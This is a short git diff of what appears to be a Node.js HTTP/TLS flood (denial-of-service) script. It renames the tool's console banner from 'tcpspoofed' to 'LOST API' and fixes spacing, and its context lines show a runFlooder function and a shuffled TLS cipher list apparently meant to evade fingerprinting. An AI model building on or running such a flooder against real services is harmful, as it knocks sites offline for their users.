@@ -11,7 +11,7 @@ var path = require('path');
 var colors = require('colors');
 var file = path.basename(__filename);
 if (process.argv.length < 0x7) {
-  console.log('tcpspoofed'.rainbow);
+  console.log('LOST API'.rainbow);
   process.exit();
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(':');
 const ciphers = "GREASE:" + [defaultCiphers[0x2], defaultCiphers[0x1], defaultCiphers[0x0], defaultCiphers.slice(0x3)].join(':');
@@ -220,4 +220,4 @@ function runFlooder() {
   });
 }
 const KillScript = () => process.exit();
-setTimeout(KillScript,args.time *1000);
+setTimeout(KillScript,args.time * 1000);
